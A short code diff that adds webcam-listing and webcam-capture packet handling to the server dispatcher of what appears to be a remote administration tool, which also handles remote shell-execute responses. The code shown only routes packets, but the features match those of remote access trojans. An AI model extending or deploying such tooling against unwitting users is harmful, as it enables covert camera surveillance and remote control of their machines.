@@ -52,6 +52,14 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetMonitorsResponse(client, (ClientPackets.GetMonitorsResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetWebcamsResponse))
+            {
+                CommandHandler.HandleGetWebcamsResponse(client, (ClientPackets.GetWebcamsResponse)packet);
+            }
+            else if (type == typeof(ClientPackets.GetWebcamResponse))
+            {
+                CommandHandler.HandleGetWebcamResponse(client, (ClientPackets.GetWebcamResponse)packet);
+            }
             else if (type == typeof(ClientPackets.DoShellExecuteResponse))
             {
                 CommandHandler.HandleDoShellExecuteResponse(client,
